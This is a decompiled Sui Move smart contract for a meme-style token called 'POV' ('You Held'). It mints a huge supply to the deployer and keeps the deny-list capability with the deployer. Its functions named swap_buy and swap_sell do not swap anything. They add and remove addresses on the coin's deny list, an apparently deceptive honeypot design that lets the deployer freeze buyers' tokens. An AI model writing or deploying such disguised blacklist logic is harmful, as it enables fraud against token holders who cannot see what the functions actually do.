module 0xd5e6576f90fc2f087fb60168cc55623bb4671d51ee978f6c8a63cf173660a200::pov {
    struct POV has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: POV, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<POV>(arg0, 9, b"POV", b"You Held", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmW7E1Cik7TKwWxBMFUxDrJByzgPk2JkfKGcQw351EDp5B"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<POV>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<POV>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<POV>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<POV>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<POV>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<POV>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<POV>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<POV>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

